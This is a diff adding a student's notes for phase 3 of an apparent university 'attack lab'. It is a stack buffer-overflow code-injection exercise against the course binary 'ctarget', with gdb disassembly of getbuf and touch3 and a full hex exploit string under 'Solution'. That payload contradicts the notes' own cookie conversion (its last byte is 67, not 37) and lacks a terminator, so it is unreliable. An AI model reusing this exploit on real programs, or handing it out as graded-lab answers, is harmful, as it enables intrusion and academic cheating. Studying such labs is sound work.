@@ -1,0 +1,53 @@
+phase 3:
+want to move cookie to rdi once again, but this time you want it as a string so can't just put the address like in phase 2
+rsp: 0x55622bd8
+cookie: 0x6ea28ad7
+put cookie through a calculator, can find on line to convert hex:
+0x6ea28ad7 = 36 65 61 32 38 61 64 37
+first use the mov and ret assebly again aka 48 c7 c7 ... c3
+however this time move cookie to rdi; in order, to do this you need to get the position of the
+of where the cookie is aka rsp + 28 so do 0x55622bd8 + 28 = 0x55622c00
+bytes before cookie = buffer + 8 bytes(rsp) + 8 bytes for touch3 = 0x28 aka 40 so 6 rows of 8 bytes
+cd target81
+gdb ctarget
+Disas getbuf
+getbuf()
+ 0x000000000040181b <+0>:     sub    $0x18,%rsp
+ 0x000000000040181f <+4>:     mov    %rsp,%rdi
+ 0x0000000000401822 <+7>:     callq  0x401a5a <Gets>
+ 0x0000000000401827 <+12>:    mov    $0x1,%eax
+ 0x000000000040182c <+17>:    add    $0x18,%rsp
+ 0x0000000000401830 <+21>:    retq
+Disas touch3
+touch3()
+ 0x0000000000401931 <+0>:     push   %rbx
+ 0x0000000000401932 <+1>:     mov    %rdi,%rbx
+ 0x0000000000401935 <+4>:     movl   $0x3,0x202bbd(%rip)        # 0x6044fc <vlevel>
+ 0x000000000040193f <+14>:    mov    %rdi,%rsi
+ 0x0000000000401942 <+17>:    mov    0x202bbc(%rip),%edi        # 0x604504 <cookie>
+ 0x0000000000401948 <+23>:    callq  0x4018b3 <hexmatch>
+ 0x000000000040194d <+28>:    test   %eax,%eax
+ 0x000000000040194f <+30>:    je     0x40196f <touch3+62>
+ 0x0000000000401951 <+32>:    mov    %rbx,%rsi
+ 0x0000000000401954 <+35>:    mov    $0x403038,%edi
+ 0x0000000000401959 <+40>:    mov    $0x0,%eax
+ 0x000000000040195e <+45>:    callq  0x400c80 <printf@plt>
+ 0x0000000000401963 <+50>:    mov    $0x3,%edi
+ 0x0000000000401968 <+55>:    callq  0x401c49 <validate>
+ 0x000000000040196d <+60>:    jmp    0x40198b <touch3+90>
+ 0x000000000040196f <+62>:    mov    %rbx,%rsi
+ 0x0000000000401972 <+65>:    mov    $0x403060,%edi
+ 0x0000000000401977 <+70>:    mov    $0x0,%eax
+ 0x000000000040197c <+75>:    callq  0x400c80 <printf@plt>
+ 0x0000000000401981 <+80>:    mov    $0x3,%edi
+ 0x0000000000401986 <+85>:    callq  0x401cfb <fail>
+ 0x000000000040198b <+90>:    mov    $0x0,%edi
+ 0x0000000000401990 <+95>:    callq  0x400df0 <exit@plt>
+
+Solution:
+48 c7 c7 00 2c 62 55 c3 //rsp + 28, aka the location of the cookie, therefore storing it into rdi
+00 00 00 00 00 00 00 00 //two lines of padding left
+00 00 00 00 00 00 00 00
+d8 2b 62 55 00 00 00 00 //address of rsp in little endian
+31 19 40 00 00 00 00 00 //touch 3 address, transfers return control to touch3
+36 65 61 32 38 61 64 67 //cookie coverted from hex, is first parameter for touch3
